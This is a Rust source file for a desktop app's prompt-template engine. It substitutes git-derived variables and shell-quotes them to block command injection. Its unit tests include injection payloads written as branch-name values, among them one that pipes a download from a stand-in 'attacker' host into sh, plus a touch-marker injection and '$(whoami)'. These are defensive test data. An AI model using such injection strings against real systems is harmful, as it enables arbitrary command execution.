use std::collections::{HashMap, HashSet};
use std::process::Command;

/// Extract template variable names from content.
///
/// Finds `{varname}` patterns and returns unique variable names
/// in order of first appearance. Matches greedily from the first
/// `{` to the first `}`, so `{{nested}}` yields `{nested`.
pub(crate) fn extract_variables(content: &str) -> Vec<String> {
    let mut vars = Vec::new();
    let mut seen = HashSet::new();
    let bytes = content.as_bytes();
    let len = bytes.len();
    let mut i = 0;

    while i < len {
        if bytes[i] == b'{' {
            // Find the closing brace
            if let Some(end) = content[i + 1..].find('}') {
                let name = &content[i + 1..i + 1 + end];
                if !name.is_empty() && seen.insert(name.to_string()) {
                    vars.push(name.to_string());
                }
                i = i + 1 + end + 1; // skip past '}'
            } else {
                break; // no closing brace found, done
            }
        } else {
            i += 1;
        }
    }

    vars
}

/// Replace `{name}` placeholders with values from the variables map.
///
/// Unmatched variables (not present in the map) are left as-is.
pub(crate) fn process_content(content: &str, variables: &HashMap<String, String>) -> String {
    process_content_inner(content, variables, false)
}

/// Shell-safe variant of [`process_content`] for templates that will be
/// executed via `sh -c` / `cmd /C`. Each substituted value is wrapped with a
/// platform-appropriate quoting so that characters like `;`, backticks, `$()`
/// and single quotes inside repo-controlled variables (branch names, commit
/// messages, PR titles, etc.) cannot escape the argument and execute further
/// commands. Literal template text is left untouched — callers remain
/// responsible for putting variable placeholders where a quoted string is
/// syntactically valid (e.g. `echo {branch}`, not `echo $(x){branch}`).
pub(crate) fn process_content_shell_safe(
    content: &str,
    variables: &HashMap<String, String>,
) -> String {
    process_content_inner(content, variables, true)
}

fn process_content_inner(
    content: &str,
    variables: &HashMap<String, String>,
    shell_safe: bool,
) -> String {
    let mut result = String::with_capacity(content.len());
    let bytes = content.as_bytes();
    let len = bytes.len();
    let mut i = 0;

    while i < len {
        if bytes[i] == b'{' {
            if let Some(end) = content[i + 1..].find('}') {
                let name = &content[i + 1..i + 1 + end];
                if let Some(value) = variables.get(name) {
                    if shell_safe {
                        result.push_str(&shell_quote(value));
                    } else {
                        result.push_str(value);
                    }
                } else {
                    // Leave unmatched variable as-is
                    result.push('{');
                    result.push_str(name);
                    result.push('}');
                }
                i = i + 1 + end + 1;
            } else {
                // No closing brace, push rest of string
                result.push_str(&content[i..]);
                break;
            }
        } else {
            // Decode the UTF-8 character starting at byte i and advance
            // past all its bytes. This is safe because '{' is ASCII, so we
            // only reach here for non-'{' leading bytes.
            let ch = content[i..].chars().next().unwrap();
            result.push(ch);
            i += ch.len_utf8();
        }
    }

    result
}

/// Platform-appropriate shell quoting for a single argument.
///
/// On POSIX (`sh -c`) we use single-quote wrapping: `'` → `'\''` and wrap in
/// single quotes, which disables every form of expansion inside the string.
/// On Windows (`cmd /C`) we wrap in double quotes and escape embedded double
/// quotes and shell metacharacters (`^`, `&`, `|`, `<`, `>`) with `^`. The two
/// shells are invoked from `execute_shell_script` and share this entry point.
fn shell_quote(value: &str) -> String {
    #[cfg(target_os = "windows")]
    {
        cmd_shell_quote(value)
    }
    #[cfg(not(target_os = "windows"))]
    {
        posix_shell_quote(value)
    }
}

#[cfg(not(target_os = "windows"))]
fn posix_shell_quote(value: &str) -> String {
    let mut out = String::with_capacity(value.len() + 2);
    out.push('\'');
    for c in value.chars() {
        if c == '\'' {
            // Close the quote, emit an escaped literal single quote, reopen.
            out.push_str("'\\''");
        } else {
            out.push(c);
        }
    }
    out.push('\'');
    out
}

#[cfg(target_os = "windows")]
fn cmd_shell_quote(value: &str) -> String {
    let mut out = String::with_capacity(value.len() + 2);
    out.push('"');
    for c in value.chars() {
        match c {
            '"' => out.push_str("\"\""),
            '^' | '&' | '|' | '<' | '>' | '%' => {
                out.push('^');
                out.push(c);
            }
            _ => out.push(c),
        }
    }
    out.push('"');
    out
}

#[tauri::command]
pub(crate) fn extract_prompt_variables(content: String) -> Vec<String> {
    extract_variables(&content)
}

#[tauri::command]
pub(crate) fn process_prompt_content(
    content: String,
    variables: HashMap<String, String>,
) -> String {
    process_content(&content, &variables)
}

/// Tauri-exposed wrapper around [`process_content_shell_safe`] for use by the
/// Smart Prompts shell-execution path. Callers must prefer this over
/// `process_prompt_content` whenever the resulting string is going to be
/// handed to `sh -c` / `cmd /C`, otherwise repo-controlled variables like
/// `{branch}` or `{pr_title}` can execute arbitrary commands.
#[tauri::command]
pub(crate) fn process_prompt_content_shell_safe(
    content: String,
    variables: HashMap<String, String>,
) -> String {
    process_content_shell_safe(&content, &variables)
}

const MAX_VARIABLE_LEN: usize = 50_000;

/// Run a git command in the given repo and return trimmed stdout, or None on failure.
fn git_output(repo_path: &str, args: &[&str]) -> Option<String> {
    let git_bin = crate::cli::resolve_cli("git");
    let output = Command::new(&git_bin)
        .arg("-C")
        .arg(repo_path)
        .args(args)
        .output()
        .ok()?;
    if output.status.success() {
        // Return empty string for successful commands with no output (e.g. no staged changes).
        // This ensures the variable exists in the context map so prompts don't report
        // "unresolved_variables" — they can check for empty content themselves.
        Some(String::from_utf8_lossy(&output.stdout).trim().to_string())
    } else {
        None
    }
}

/// Truncate a string to `max` bytes, appending a marker if truncated.
fn truncate(s: String, max: usize) -> String {
    if s.len() <= max {
        return s;
    }
    // Find the last char boundary at or before `max` bytes
    let end = s.char_indices()
        .take_while(|(i, _)| *i < max)
        .last()
        .map(|(i, c)| i + c.len_utf8())
        .unwrap_or(max);
    let mut truncated = s[..end].to_string();
    truncated.push_str("\n[...truncated]");
    truncated
}

/// Detect the base branch by checking which of main/master/develop exists locally.
/// Parse owner and slug from a git remote URL.
/// Handles SSH (git@github.com:owner/repo.git) and HTTPS (https://github.com/owner/repo.git).
fn parse_remote_owner_slug(url: &str) -> Option<(String, String)> {
    let path = if let Some(rest) = url.strip_prefix("git@") {
        // git@github.com:owner/repo.git → owner/repo.git
        rest.split_once(':').map(|(_, p)| p)?
    } else {
        // https://github.com/owner/repo.git → /owner/repo.git (after host)
        let without_scheme = url.strip_prefix("https://").or_else(|| url.strip_prefix("http://"))?;
        // Skip the host: github.com/owner/repo.git
        without_scheme.find('/').map(|i| &without_scheme[i + 1..])?
    };
    let path = path.trim_end_matches(".git").trim_end_matches('/');
    let mut parts = path.splitn(2, '/');
    let owner = parts.next()?.to_string();
    let slug = parts.next()?.to_string();
    if owner.is_empty() || slug.is_empty() { return None; }
    Some((owner, slug))
}

fn detect_base_branch(repo_path: &str) -> Option<String> {
    let output = git_output(repo_path, &["branch", "--list", "main", "master", "develop"])?;
    // Each line is like "  main" or "* main"; pick first in priority order.
    let branches: Vec<String> = output
        .lines()
        .map(|l| l.trim_start_matches('*').trim().to_string())
        .collect();
    for candidate in &["main", "master", "develop"] {
        if branches.iter().any(|b| b == candidate) {
            return Some(candidate.to_string());
        }
    }
    None
}

/// Resolve all auto-resolvable git context variables for a repository path.
///
/// Runs independent git commands in parallel via rayon for lower latency.
/// Best-effort: variables that fail to resolve are simply omitted from the map.
#[tauri::command]
pub(crate) async fn resolve_context_variables(repo_path: String) -> Result<HashMap<String, String>, String> {
    tokio::task::spawn_blocking(move || -> HashMap<String, String> {
        // Define all git variable resolvers as (key, args) pairs
        let commands: Vec<(&str, Vec<&str>, bool)> = vec![
            ("branch", vec!["rev-parse", "--abbrev-ref", "HEAD"], false),
            ("diff", vec!["diff"], true),
            ("staged_diff", vec!["diff", "--staged"], true),
            ("changed_files", vec!["status", "--short"], false),
            ("commit_log", vec!["log", "--oneline", "-20"], false),
            ("last_commit", vec!["log", "-1", "--format=%H %s"], false),
            ("conflict_files", vec!["diff", "--name-only", "--diff-filter=U"], false),
            ("stash_list", vec!["stash", "list"], false),
            ("remote_url", vec!["config", "--get", "remote.origin.url"], false),
            ("current_user", vec!["config", "user.name"], false),
        ];

        // Run all git commands in parallel using std threads
        let results: Vec<(String, Option<String>)> = std::thread::scope(|s| {
            let handles: Vec<_> = commands.into_iter().map(|(key, args, should_truncate)| {
                let rp = &repo_path;
                s.spawn(move || {
                    let val = git_output(rp, &args);
                    let val = if should_truncate { val.map(|v| truncate(v, MAX_VARIABLE_LEN)) } else { val };
                    (key.to_string(), val)
                })
            }).collect();
            handles.into_iter().map(|h| h.join().unwrap()).collect()
        });

        let mut vars = HashMap::new();
        for (key, val) in results {
            if let Some(v) = val {
                vars.insert(key, v);
            }
        }

        if let Some(v) = detect_base_branch(&repo_path) {
            vars.insert("base_branch".to_string(), v);
        }
        if let Some(name) = std::path::Path::new(&repo_path)
            .file_name()
            .and_then(|n| n.to_str())
        {
            vars.insert("repo_name".to_string(), name.to_string());
        }
        vars.insert("repo_path".to_string(), repo_path.clone());

        // Derive repo_owner and repo_slug from remote_url
        if let Some(url) = vars.get("remote_url")
            && let Some((owner, slug)) = parse_remote_owner_slug(url)
        {
            vars.insert("repo_owner".to_string(), owner);
            vars.insert("repo_slug".to_string(), slug);
        }

        // Derive dirty_files_count from changed_files
        if let Some(changed) = vars.get("changed_files") {
            let count = changed.lines().filter(|l| !l.is_empty()).count();
            vars.insert("dirty_files_count".to_string(), count.to_string());
        }

        // Branch status (ahead/behind remote)
        if let Some(status) = git_output(&repo_path, &["rev-list", "--left-right", "--count", "@{upstream}...HEAD"]) {
            let parts: Vec<&str> = status.split_whitespace().collect();
            if parts.len() == 2 {
                let behind = parts[0];
                let ahead = parts[1];
                vars.insert("branch_status".to_string(), format!("{ahead} ahead, {behind} behind"));
            }
        }

        vars
    })
    .await
    .map_err(|e| format!("spawn_blocking join error: {e}"))
}

#[cfg(test)]
mod tests {
    use super::*;

    // --- extract_variables tests ---

    #[test]
    fn extract_variables_basic() {
        let vars = extract_variables("Hello {name}, welcome to {place}!");
        assert_eq!(vars, vec!["name", "place"]);
    }

    #[test]
    fn extract_variables_empty_string() {
        let vars = extract_variables("");
        assert!(vars.is_empty());
    }

    #[test]
    fn extract_variables_no_vars() {
        let vars = extract_variables("Hello world!");
        assert!(vars.is_empty());
    }

    #[test]
    fn extract_variables_deduplicates() {
        let vars = extract_variables("{name} and {name} again");
        assert_eq!(vars, vec!["name"]);
    }

    #[test]
    fn extract_variables_multiple() {
        let vars = extract_variables("{a} and {b}");
        assert_eq!(vars, vec!["a", "b"]);
    }

    #[test]
    fn extract_variables_nested_braces() {
        // Matches greedily: "{{nested}}" captures "{nested" as the variable name
        let vars = extract_variables("{{nested}}");
        assert_eq!(vars, vec!["{nested"]);
    }

    #[test]
    fn extract_variables_unclosed_brace() {
        let vars = extract_variables("Hello {name");
        assert!(vars.is_empty());
    }

    // --- process_content tests ---

    #[test]
    fn process_content_single_var() {
        let mut vars = HashMap::new();
        vars.insert("name".to_string(), "World".to_string());
        let result = process_content("Hello {name}!", &vars);
        assert_eq!(result, "Hello World!");
    }

    #[test]
    fn process_content_multiple_vars() {
        let mut vars = HashMap::new();
        vars.insert("first".to_string(), "John".to_string());
        vars.insert("last".to_string(), "Doe".to_string());
        let result = process_content("Hello {first} {last}!", &vars);
        assert_eq!(result, "Hello John Doe!");
    }

    #[test]
    fn process_content_repeated_var() {
        let mut vars = HashMap::new();
        vars.insert("x".to_string(), "5".to_string());
        let result = process_content("{x} + {x} = 2{x}", &vars);
        assert_eq!(result, "5 + 5 = 25");
    }

    #[test]
    fn process_content_unmatched_var_left_as_is() {
        let mut vars = HashMap::new();
        vars.insert("name".to_string(), "World".to_string());
        let result = process_content("Hello {name}, {unknown}!", &vars);
        assert_eq!(result, "Hello World, {unknown}!");
    }

    #[test]
    fn process_content_no_vars() {
        let result = process_content("No variables here", &HashMap::new());
        assert_eq!(result, "No variables here");
    }

    #[test]
    fn process_content_empty_string() {
        let result = process_content("", &HashMap::new());
        assert_eq!(result, "");
    }

    // --- UTF-8 multi-byte tests ---

    #[test]
    fn extract_variables_with_multibyte_utf8() {
        let vars = extract_variables("Héllo {name}, 日本語 {place}!");
        assert_eq!(vars, vec!["name", "place"]);
    }

    #[test]
    fn process_content_with_accented_chars() {
        let mut vars = HashMap::new();
        vars.insert("name".to_string(), "René".to_string());
        let result = process_content("Héllo {name}!", &vars);
        assert_eq!(result, "Héllo René!");
    }

    #[test]
    fn process_content_with_cjk_chars() {
        let mut vars = HashMap::new();
        vars.insert("name".to_string(), "World".to_string());
        let result = process_content("日本語 {name}!", &vars);
        assert_eq!(result, "日本語 World!");
    }

    #[test]
    fn process_content_with_emoji() {
        let mut vars = HashMap::new();
        vars.insert("name".to_string(), "Bot".to_string());
        let result = process_content("Hello 🌍 {name}! 🎉", &vars);
        assert_eq!(result, "Hello 🌍 Bot! 🎉");
    }

    // --- resolve_context_variables tests ---

    #[tokio::test]
    async fn resolve_context_variables_non_git_path() {
        let vars = resolve_context_variables("/tmp".to_string()).await.unwrap();
        // Should return empty or near-empty map, no panic
        assert!(
            vars.get("branch").is_none() || !vars.get("branch").unwrap().is_empty()
        );
    }

    // --- process_content_shell_safe tests ---

    #[test]
    fn shell_safe_wraps_plain_value() {
        let mut vars = HashMap::new();
        vars.insert("branch".into(), "main".into());
        let result = process_content_shell_safe("echo {branch}", &vars);
        #[cfg(not(target_os = "windows"))]
        assert_eq!(result, "echo 'main'");
        #[cfg(target_os = "windows")]
        assert_eq!(result, "echo \"main\"");
    }

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn shell_safe_escapes_embedded_single_quote() {
        // Branch name crafted as a POSIX second-order injection vector.
        // The emitted script wraps the value in single quotes using the
        // standard `'\''` dance for every embedded `'`.
        let mut vars = HashMap::new();
        vars.insert(
            "branch".into(),
            "main'; curl attacker | sh; echo '".into(),
        );
        let result = process_content_shell_safe("git checkout {branch}", &vars);
        assert_eq!(
            result,
            "git checkout 'main'\\''; curl attacker | sh; echo '\\'''"
        );
    }

    #[cfg(not(target_os = "windows"))]
    #[tokio::test]
    async fn shell_safe_roundtrip_through_sh_c() {
        // End-to-end: feed an injection-crafted branch to sh -c and verify that
        // the attacker command never runs — no stray marker file. The exact
        // stdout text is not asserted (macOS /bin/sh may normalise trailing
        // quote artefacts); the security invariant we care about is that the
        // injected `touch` never executed.
        let marker = std::env::temp_dir().join("tuictest_prompt_shell_safe_inject");
        let _ = std::fs::remove_file(&marker);
        let mut vars = HashMap::new();
        vars.insert(
            "branch".into(),
            format!("main'; touch {}; echo '", marker.display()),
        );
        let script = process_content_shell_safe("echo {branch}", &vars);
        let output = tokio::process::Command::new("sh")
            .arg("-c")
            .arg(&script)
            .output()
            .await
            .expect("sh spawn failed");
        assert!(
            output.status.success(),
            "sh exited non-zero: status={:?} stderr={}",
            output.status,
            String::from_utf8_lossy(&output.stderr)
        );
        assert!(
            !marker.exists(),
            "injection fired — shell quoting is broken (script was: {script})"
        );
    }

    #[test]
    fn shell_safe_unmatched_var_left_as_is() {
        // Unresolved variables must NOT be wrapped — they stay literally as
        // `{name}`, matching process_content semantics.
        let result = process_content_shell_safe("echo {unknown}", &HashMap::new());
        assert_eq!(result, "echo {unknown}");
    }

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn posix_shell_quote_examples() {
        assert_eq!(posix_shell_quote("simple"), "'simple'");
        assert_eq!(posix_shell_quote(""), "''");
        assert_eq!(posix_shell_quote("a'b"), "'a'\\''b'");
        assert_eq!(posix_shell_quote("$(whoami)"), "'$(whoami)'");
    }

    #[test]
    fn truncate_long_string() {
        let long = "x".repeat(60_000);
        let result = truncate(long, MAX_VARIABLE_LEN);
        assert!(result.len() <= MAX_VARIABLE_LEN + 15); // max + marker
        assert!(result.ends_with("[...truncated]"));
    }

    #[test]
    fn truncate_short_string() {
        let short = "hello".to_string();
        let result = truncate(short.clone(), MAX_VARIABLE_LEN);
        assert_eq!(result, "hello");
    }

    #[test]
    fn truncate_multibyte_boundary() {
        // 3-byte chars: each "é" is 2 bytes. Create a string where max falls mid-char.
        let s = "é".repeat(30_000); // 60,000 bytes
        let result = truncate(s, 50_001); // odd byte count, likely mid-char
        assert!(result.ends_with("[...truncated]"));
        // Verify it's valid UTF-8 (won't panic if we got here)
        assert!(result.len() <= 50_003 + 15); // max + char_len + marker
    }
}
